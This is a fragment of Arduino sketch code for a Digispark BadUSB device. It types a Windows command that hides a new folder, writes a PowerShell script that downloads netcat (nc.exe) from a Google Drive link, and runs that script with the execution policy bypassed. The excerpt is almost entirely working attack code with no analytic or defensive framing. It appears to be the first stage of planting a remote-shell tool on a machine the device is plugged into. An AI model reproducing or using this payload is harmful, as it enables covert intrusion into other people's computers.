...
void setup() {
  ...
  DigiKeyboard.print("cd / & md p & attrib +h \\p & cd p & echo (new-object System.Net.WebClient).DownloadFile(\"https://drive.google.com/uc?export=download&id=1VUHFMTFVgVDE5d4905P8xG7O_D5U7VIx\",\"nc.exe\")> y.PS1 & powershell -ExecutionPolicy ByPass -File y.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
